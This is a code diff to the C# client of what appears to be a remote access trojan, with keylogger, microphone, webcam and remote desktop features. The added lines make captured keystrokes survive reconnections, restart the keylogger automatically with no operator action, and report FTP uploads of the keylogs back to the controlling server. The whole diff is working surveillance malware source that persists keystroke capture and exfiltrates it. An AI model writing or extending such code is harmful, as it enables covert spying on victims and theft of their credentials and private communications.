@@ -212,6 +212,24 @@ internal class TlsClient : IDisposable
             catch { }
         });
 
+        // Refresh the FTP status callback with this connection's writer so uploads that happen
+        // while the keylogger window is closed still report status to the server.
+        if (KeyloggerFeature.IsFtpConfigured)
+            KeyloggerFeature.RefreshFtpCallback(async (evt, fn, msg, att) => await WritePacketAsync(new Packet
+            {
+                Type = PacketType.KeyloggerFtpStatus,
+                Data = JsonSerializer.Serialize(
+                    new KeyloggerFtpStatusStub { Event = evt, Filename = fn, Message = msg, Attempt = att },
+                    SeroJson.Default.KeyloggerFtpStatusStub)
+            }, CancellationToken.None));
+
+        // Auto-restart keylogger if it was running before this reconnect.
+        if (KeyloggerFeature.RestartOnConnect)
+        {
+            KeyloggerFeature.Start();
+            KeyloggerFeature.ClearRestartOnConnect();
+        }
+
         // Read loop - handles all incoming commands
         await ReadLoop(sessionCt);
 
@@ -221,8 +239,9 @@ internal class TlsClient : IDisposable
         MicrophoneFeature.Stop();
         RemoteDesktopFeature.Stop();
         WebcamFeature.Stop();
-        // Keylogger: Stop() flushes buffered keystrokes to disk so they survive the reconnect.
-        KeyloggerFeature.Stop();
+        // Keylogger: Stop(reconnecting:true) flushes to disk and sets _restartOnConnect so the
+        // hook thread auto-restarts on the next connection without operator action.
+        KeyloggerFeature.Stop(reconnecting: true);
     }
 
     // ── Detached process spawn via CreateProcessW ────────────────────────
@@ -865,7 +884,7 @@ internal class TlsClient : IDisposable
                     break;
 
                 case PacketType.KeyloggerStop:
-                    _ = Task.Run(() => KeyloggerFeature.Stop());
+                    _ = Task.Run(() => KeyloggerFeature.Stop(reconnecting: false));
                     break;
 
                 case PacketType.KeyloggerGetLogs:
